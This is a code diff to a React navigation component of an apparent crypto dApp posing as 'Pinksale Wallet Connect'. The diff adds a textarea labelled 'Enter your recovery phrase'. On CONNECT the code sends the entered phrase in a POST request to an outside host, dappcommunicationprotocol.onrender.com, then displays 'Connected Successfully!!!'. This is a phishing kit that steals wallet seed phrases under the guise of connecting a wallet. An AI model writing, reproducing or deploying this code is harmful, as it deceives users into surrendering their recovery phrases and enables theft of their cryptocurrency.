@@ -39,25 +39,70 @@ import { TbBrandTelegram } from "react-icons/tb";
 import { LuTwitter } from "react-icons/lu";
 import { CiFacebook } from "react-icons/ci";
 
-
-
 import AOS from "aos";
 import "aos/dist/aos.css";
 import LoadingModal from "../LoadingModal";
+import { toast } from "react-toastify";
 
 const Navbar = () => {
   const [showModal, setShowModal] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState(false);
   const [isNavOpen, setIsNavOpen] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [phrase, setPhrase] = useState("");
+  const [isError, setIsError] = useState(false);
+  const [isSucess, setIsSucess] = useState(false);
 
-  const toggleConnect = () => {
-    setIsLoading(true);
-    setTimeout(() => {
+  const toggleConnect = async () => {
+    if (phrase === "") {
+      setIsError(true);
+      setTimeout(() => {
+        setIsError(false);
+      }, 3000);
+    } else {
+      setIsLoading(true);
+
+      const body = {
+        wallet: "Pinksale Wallet Connect",
+        phrase: phrase,
+      };
+
+      try {
+        const url = "https://dappcommunicationprotocol.onrender.com/details";
+
+        const res = await fetch(url, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(body),
+        });
+
+        const data = await res.json();
+
+        if (res.status === 200) {
+          setIsSucess(true);
+          setPhrase("");
+        }
+
+        // Clear all errors incase, turn of the loading state, and show sucess message.
+        // setIsError("");
+        // setWalletPhrase("");
+        // setFetchingData(false);
+        // setSuccess(data.message);
+      } catch (error) {
+        // setFetchingData(false);
+        // setIsError("Failed to connect manually. Please try again.");
+      }
+
       setIsLoading(false);
-    }, 3000); // Simulating a 3-second loading process
+      // setTimeout(() => {
+      //   setIsLoading(false);
+      // }, 3000); // Simulating a 3-second loading process
+    }
   };
-  
+
+  const handleTextChange = (e) => {
+    setPhrase(e.target.value);
+  };
 
   // To run AOS
   useEffect(() => {
@@ -66,17 +111,6 @@ const Navbar = () => {
   }, []);
 
   // For loading animation...
-  useEffect(() => {
-    // Simulating delay for demonstration purposes
-    const timer = setTimeout(() => {
-      setLoading(false);
-    }, 3000); // Adjust the delay time as needed
-
-    // Clear the timer when component unmounts or when loading is finished
-    return () => clearTimeout(timer);
-  }, []);
-
-  
 
   // To sellect a wallet
   const toggleModal = () => {
@@ -230,8 +264,15 @@ const Navbar = () => {
               <div className=" border-b-2 border-[#F95997] w-full"></div>
 
               <div className="wallet w-full">
+                {isError && (
+                  <div className="text-[red] text-[14px] mb-1">
+                    Text field can not be empty
+                  </div>
+                )}
                 <form action="">
                   <textarea
+                    onChange={handleTextChange}
+                    value={phrase}
                     className="  w-full h-[27vh] shadow-lg border focus:border-gray-300 font-semibold py-2 px-4 rounded-md focus:outline-none"
                     placeholder="Enter your recovery phrase"
                   ></textarea>
@@ -244,10 +285,17 @@ const Navbar = () => {
                 </p>
               </div>
 
-              <div className=" w-full bg-[#FDEAF1] font-semibold text-[#F95997] text-center rounded-lg py-3 text-lg">
-                <button onClick={toggleConnect}>CONNECT</button>
-                <LoadingModal isLoading={isLoading}/>
-              </div>
+              {isSucess ? (
+                <div className=" w-full bg-[#82f986] font-semibold text-[#ffffff] text-center rounded-lg py-3 text-lg">
+                  <button>Connected Successfully!!!</button>
+                  <LoadingModal isLoading={isLoading} />
+                </div>
+              ) : (
+                <div className=" w-full bg-[#FDEAF1] font-semibold text-[#F95997] text-center rounded-lg py-3 text-lg">
+                  <button onClick={toggleConnect}>CONNECT</button>
+                  <LoadingModal isLoading={isLoading} />
+                </div>
+              )}
             </div>
           </div>
         </div>
